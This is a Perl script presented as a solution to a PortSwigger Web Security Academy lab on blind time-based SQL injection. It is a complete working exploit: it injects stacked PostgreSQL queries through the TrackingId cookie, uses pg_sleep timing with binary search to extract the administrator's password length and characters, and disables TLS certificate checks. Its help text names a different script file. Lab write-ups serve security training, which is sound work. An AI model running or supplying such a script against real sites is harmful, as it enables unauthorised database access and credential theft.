#!usr/bin/env perl
#
#   Author: <wexe1@protonmail.com>
#   License: MIT
#
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::CookieJar::LWP;
use URI::Encode qw(uri_encode);
use Getopt::Long;
use Pod::Usage;
use feature 'say';
use Term::ANSIColor;

BEGIN {
    say colored("PortSwigger Web Security Academy", "bold yellow");
    say colored("Lab: Blind SQL injection with time delays and information retrieval", "bold yellow");
    say colored("Solution by weXe1", "bold blue");
    print "\n";
}

our $| = 1;

our(
    $url,
    $proxy,
    $maxLength,
    $help,
);

GetOptions(
    'u|url=s'           => \$url,
    'p|proxy=s'         => \$proxy,
    'm|max-length=i'    => \$maxLength,
    'h|help'            => \$help
);

pod2usage(1) if $help;

pod2usage(1) unless $url;
$maxLength = 20 unless $maxLength;

our $ua = LWP::UserAgent->new(
    cookie_jar  => HTTP::CookieJar::LWP->new(),
    protocols_allowed   => ['http', 'https'],
);
$ua->ssl_opts(verify_hostname => 0, SSL_verify_mode => 0x00);

if ($proxy) {
    $ua->proxy('https' => $proxy);
    $ua->proxy('http' => $proxy);
}

our $requestCount = 0;

say colored("[*] Obtaining password length for user 'administrator', it will take a long time... ", "cyan");

our $passwordLength = 0;

{
    my ($begin, $end) = (1, $maxLength);
    while ($begin <= $end) {
        my $middle = int(($begin + $end + 1) / 2);
        my $payload = "TrackingId='\%3b" . uri_encode(" select case when (length(password) < $middle) then pg_sleep(10) else pg_sleep(0) end from users where username = 'administrator");
        my $result = &makeRequest($payload);

        if ($begin == $middle && $middle == $end && !$result) {
            if (&makeRequest("TrackingId='\%3b". uri_encode(" select case when (length(password) = $middle) then pg_sleep(10) else pg_sleep(0) end from users where username = 'administrator"))) {
                $passwordLength = $middle;
            }
            last;
        }

        if ($result) {
            $end = $middle - 1;
        } else {
            $begin = $middle;
        }
    }
}

if ($passwordLength > 0) {
    say colored("[+] Password length: $passwordLength, found in $requestCount requests", 'green');
} else {
    say colored("[-] Unable to obtain password length. Exiting...", 'red');
    exit;
}

say colored("[*] Obtaining password for user 'administrator', it will take a long time... ", "cyan");

my $password = '';
my @chars = ('0'..'9', 'A'..'Z', 'a'..'z');
for my $length (1..$passwordLength) {
    my ($begin, $end) = (0, $#chars);
    while ($begin <= $end) {
        my $middle = int(($begin + $end + 1) / 2);
        my $letter = $chars[$middle];
        my $payload = &generatePayload($length, $letter);
        my $result = &makeRequest($payload);

        if ($begin == $middle && $middle == $end && !$result) {
            $password .= $letter;
            last;
        }

        if ($result) {
            $end = $middle - 1;
        } else {
            $begin = $middle;
        }
    }
    say colored("[$length] Found: $password" , "green");
    last if $length > length $password;
}

say colored("[*] Finished in $requestCount requests.", "bold magenta");

sub generatePayload {
    my $idx = shift;
    my $pass = shift;
    my $payload = " select case when (substr(password, $idx, 1)<'$pass') then pg_sleep(10) else pg_sleep(0) end from users where username = 'administrator";  # in this lab db is PostgreSQL
    $payload = "TrackingId='\%3b" . uri_encode($payload);
    return $payload;
}

sub makeRequest {
    my $payload = shift;
    my $start = time();
    my $response = $ua->get($url, 'Cookie' => $payload);
    my $end = time();
    my $timeDiff = $end - $start;
    $requestCount++;

    if ($response->is_success) {
        if ($timeDiff > 9) {
            return 1;
        }
        return 0;
    } else {
        say STDERR colored($response->status_line . ": [$payload]", "on_red");
        return 0;
    }
}

__END__

=head1 SYNOPSIS

 $ perl blind-conditional-errors.pl [options]

=head1 OPTIONS

     --url=<URL>                Target URL of the lab (required)
     --proxy=<URL>              HTTP or HTTPS proxy URL (optional)
     --max-length=<number>      Max length of brute forced password (optional)
     --help                     Prints this help

=cut
